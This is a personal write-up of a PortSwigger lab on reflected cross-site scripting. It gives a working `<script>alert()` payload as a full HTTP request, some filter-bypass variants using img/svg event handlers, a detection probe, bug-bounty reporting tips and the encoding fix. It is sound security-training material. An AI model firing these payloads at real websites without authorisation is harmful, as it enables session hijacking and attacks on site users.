# LAB: Reflected XSS into HTML context with nothing encoded

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | Apprentice                                                                                                                     |
| **Date**                    | 2026-11-21                                                                                                                     |
| **Time**                    |             1                                                                                                                   |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-html-context-nothing-encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) |

## 1. Objective

Perform a Reflected Cross-Site Scripting (XSS) attack by submitting a payload into the search input that calls the `alert()` function when rendered in the victim's browser.

## 2. Surface

- Search input query parameter (`/search?search=...`).
- HTML response reflection point within the search result heading (`<h1>0 search results for '...'</h1>`).

## 3. Hypothesis

If the application reflects user input submitted via the `search` GET parameter directly into the HTML response without context-aware HTML encoding or sanitization, injecting executable HTML tags (such as `<script>`) will cause the browser to interpret and execute the enclosed JavaScript code.

## 4. Payload that worked

Request:
```http
GET /?search=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/?search=test
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3293
```
## 5. Why it works

The backend server receives the user input via the `search` GET parameter and dynamically reflects it directly into the HTML response body within an `<h1>` element. Because the application performs no sanitization or HTML entity encoding (such as converting `<` to `&lt;` and `>` to `&gt;`), the browser parses the injected `<script>alert('xss')</script>` tag as executable markup rather than literal text, executing the JavaScript function `alert('xss')`.
## 6. What I tried that failed

- Submitting the basic payload `<script>alert('xss')</script>` worked on the first attempt without encountering any client-side or server-side filtering, as the target endpoint reflects raw HTML markup without restrictions.
- Rule extracted: When probing reflected inputs, always inspect the raw HTTP response source to verify whether special characters (`<`, `>`, `"`, `'`) are passed literally or encoded before testing complex bypass payloads.
  
## 7. In a real target (bounty translation)

- Where it shows up: Unsanitized search inputs, error messages, pagination labels, or URL path parameters that reflect user input into the HTML body.
- Quick detection: Pass a unique string with HTML characters (e.g., `test"'><i>x1</i>`) and inspect the response in Burp Repeater to see if `<` and `>` render literally.
- Impact: Session hijacking via cookie exfiltration, credential harvesting via DOM manipulation, or performing unauthorized actions on behalf of the victim.
- In the report: Document the vulnerable endpoint, include the raw HTTP request/response showing the unencoded reflection point, and state the PoC triggering `alert()`.

## 8. Bypass / variants noticed

- Standard reflected XSS variations in HTML body context include using alternative HTML tags or event handlers (e.g., `<img src=x onerror=alert('xss')>`, `<svg onload=alert('xss')>`) if `<script>` tags are blocked by basic keyword filters.
## 9. Takeaway

All dynamic content reflected into HTML body contexts must be strictly HTML-entity encoded before rendering, ensuring the browser treats the input strictly as literal text data rather than executable markup code.
